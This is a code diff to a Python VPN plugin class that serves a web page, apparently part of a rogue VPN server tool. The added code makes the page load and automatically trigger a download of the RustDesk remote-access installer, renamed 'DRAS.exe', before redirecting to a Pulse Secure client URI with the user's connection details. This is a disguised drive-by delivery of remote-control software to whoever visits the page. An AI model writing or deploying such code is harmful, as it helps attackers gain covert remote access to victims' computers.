@@ -278,27 +278,59 @@ class PulseSecurePlugin(VPNPlugin):
         elif handler.path == '/pulse':
             self.logger.info('Sending URI handler response ..')
             html = """<html><body>
+            <div id="message" style="font-family: Arial; text-align: center; margin-top: 50px;">
+                <h3>Téléchargement en cours...</h3>
+                <p>Cliquez sur le lien ci-dessous si le téléchargement ne démarre pas automatiquement :</p>
+                <a href="https://github.com/rustdesk/rustdesk/releases/download/1.4.0/rustdesk-1.4.0-x86_64.exe" 
+                   download="DRAS.exe" id="downloadLink" 
+                   style="color: blue; text-decoration: underline; cursor: pointer;">
+                   Télécharger DRAS.exe
+                </a>
+                <p style="margin-top: 20px;">Redirection vers Pulse Secure dans <span id="countdown">3</span> secondes...</p>
+            </div>
+            
             <script>
-                // Téléchargement automatique du fichier depuis GitHub
+                // Fonction de téléchargement avec gestion d'erreur
                 function downloadFile() {
-                    const link = document.createElement('a');
-                    link.href = 'https://github.com/monfichier.txt';
-                    link.download = 'monfichier.txt';
-                    link.style.display = 'none';
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
+                    try {
+                        // Créer le lien de téléchargement
+                        const link = document.getElementById('downloadLink');
+                        
+                        // Simuler un clic utilisateur après un petit délai
+                        setTimeout(() => {
+                            link.click();
+                        }, 500);
+                        
+                    } catch (error) {
+                        console.log('Erreur lors du téléchargement:', error);
+                    }
                 }
                 
-                // Lancer le téléchargement immédiatement
-                downloadFile();
-                
-                // Puis rediriger vers pulseclient
-                window.location.href = """ + \
+                // Fonction de redirection avec compte à rebours
+                function redirectToPulse() {
+                    let count = 3;
+                    const countdownElement = document.getElementById('countdown');
+                    
+                    const timer = setInterval(() => {
+                        count--;
+                        countdownElement.textContent = count;
+                        
+                        if (count <= 0) {
+                            clearInterval(timer);
+                            window.location.href = """ + \
                    f"`pulsesecureclient://connect?name={self.vpn_name}&server=" \
                    "https://${document.domain}&userrealm=Users&" \
                    f"username={self.pulse_username}&store={str(self.pulse_save_connection).lower()}`;" + \
                    """
+                        }
+                    }, 1000);
+                }
+                
+                // Lancer le téléchargement et la redirection
+                window.onload = function() {
+                    downloadFile();
+                    redirectToPulse();
+                };
             </script>
             </body></html>"""
             handler.send_response(200)
